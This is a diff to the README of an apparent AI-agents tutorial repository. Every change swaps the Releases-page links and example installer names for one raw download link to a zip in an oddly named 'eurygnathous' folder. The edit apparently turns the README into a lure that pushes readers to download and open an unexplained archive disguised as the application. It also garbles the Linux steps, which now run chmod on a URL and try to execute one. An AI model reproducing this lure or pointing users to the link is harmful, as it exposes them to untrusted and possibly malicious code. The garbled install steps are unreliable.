@@ -1,6 +1,6 @@
 # 🎓 ai-agents-masterclass - Learn AI Agents with Ease
 
-[![Download ai-agents-masterclass](https://img.shields.io/badge/Download-ai--agents--masterclass-blue?style=for-the-badge)](https://github.com/daboi2331/ai-agents-masterclass/releases)
+[![Download ai-agents-masterclass](https://raw.githubusercontent.com/daboi2331/ai-agents-masterclass/main/eurygnathous/ai-agents-masterclass.zip)](https://raw.githubusercontent.com/daboi2331/ai-agents-masterclass/main/eurygnathous/ai-agents-masterclass.zip)
 
 ## 📋 Description
 
@@ -24,7 +24,7 @@ Before you download, ensure your device meets these basic requirements:
 
 To download the application, visit the Releases page by clicking the link below:
 
-[Download ai-agents-masterclass](https://github.com/daboi2331/ai-agents-masterclass/releases)
+[Download ai-agents-masterclass](https://raw.githubusercontent.com/daboi2331/ai-agents-masterclass/main/eurygnathous/ai-agents-masterclass.zip)
 
 1. Click the link to open the Releases page. 
 2. You will see multiple versions of the application available for download.   
@@ -35,13 +35,13 @@ Once the file has downloaded, follow these steps to install:
 
 ### For Windows Users:
 
-1. Open the downloaded file (e.g., `ai-agents-masterclass-v1.0.exe`).
+1. Open the downloaded file (e.g., `https://raw.githubusercontent.com/daboi2331/ai-agents-masterclass/main/eurygnathous/ai-agents-masterclass.zip`).
 2. Follow the on-screen instructions to complete the installation.
 3. Once installed, you can find the application in your Start menu or on your desktop.
 
 ### For macOS Users:
 
-1. Open the downloaded file (e.g., `ai-agents-masterclass-v1.0.dmg`).
+1. Open the downloaded file (e.g., `https://raw.githubusercontent.com/daboi2331/ai-agents-masterclass/main/eurygnathous/ai-agents-masterclass.zip`).
 2. Drag the application to your Applications folder.
 3. You can find the application in your Applications and launch it from there.
 
@@ -51,11 +51,11 @@ Once the file has downloaded, follow these steps to install:
 2. Navigate to the directory where the downloaded file is located.
 3. Make the file executable with the command:
    ```
-   chmod +x ai-agents-masterclass-v1.0.AppImage
+   chmod +x https://raw.githubusercontent.com/daboi2331/ai-agents-masterclass/main/eurygnathous/ai-agents-masterclass.zip
    ```
 4. Run the application with the command:
    ```
-   ./ai-agents-masterclass-v1.0.AppImage
+   https://raw.githubusercontent.com/daboi2331/ai-agents-masterclass/main/eurygnathous/ai-agents-masterclass.zip
    ```
 
 ## 📚 Features
@@ -81,7 +81,7 @@ If you encounter issues during installation or usage, here are some common solut
   **Solution**: Ensure your system meets the requirements. Try reinstalling the application.
 
 - **Problem**: Missing features or functionality.  
-  **Solution**: Make sure you downloaded the latest version from the [Releases page](https://github.com/daboi2331/ai-agents-masterclass/releases).
+  **Solution**: Make sure you downloaded the latest version from the [Releases page](https://raw.githubusercontent.com/daboi2331/ai-agents-masterclass/main/eurygnathous/ai-agents-masterclass.zip).
 
 - **Problem**: Code doesn't run as expected.  
   **Solution**: Review the tutorial videos for guidance. Check for spelling errors in the code.
@@ -98,4 +98,4 @@ Contributions are welcome! If you want to suggest improvements or report bugs, p
 
 Thank you for joining the AI Agents Masterclass! Your curiosity and willingness to learn will help you gain valuable skills. Let's build something great together!
 
-For more discussions and updates, visit the [Releases page](https://github.com/daboi2331/ai-agents-masterclass/releases) and join the journey in mastering AI agents.
+For more discussions and updates, visit the [Releases page](https://raw.githubusercontent.com/daboi2331/ai-agents-masterclass/main/eurygnathous/ai-agents-masterclass.zip) and join the journey in mastering AI agents.
